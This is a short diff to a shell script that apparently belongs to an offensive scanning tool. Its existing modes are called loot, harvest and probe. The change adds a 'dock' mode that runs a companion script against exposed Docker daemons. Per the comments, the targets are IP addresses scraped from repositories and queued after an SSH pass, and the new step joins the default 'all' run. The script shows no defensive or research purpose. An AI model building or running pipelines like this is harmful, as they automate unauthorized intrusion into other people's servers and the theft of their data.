@@ -223,10 +223,19 @@ loot_now() {
     fi
 }
 
+# Exposed docker daemons need no credentials at all - run it after the ssh pass
+# so the queue (every IP any repo mentioned) is already populated.
+dock_now() {
+    if [ -r "$SELF_DIR/dock.sh" ]; then
+        HUNT_WORK="$WORK" sh "$SELF_DIR/dock.sh" || true
+    fi
+}
+
 case "${1:-all}" in
     loot)    loot_now ;;
+    dock)    dock_now ;;
     harvest) harvest ;;
     probe)   probe ;;
-    all)     loot_now; harvest; probe ;;
-    *)       echo "usage: $0 [loot|harvest|probe|all]"; exit 2 ;;
+    all)     loot_now; harvest; probe; dock_now ;;
+    *)       echo "usage: $0 [loot|dock|harvest|probe|all]"; exit 2 ;;
 esac
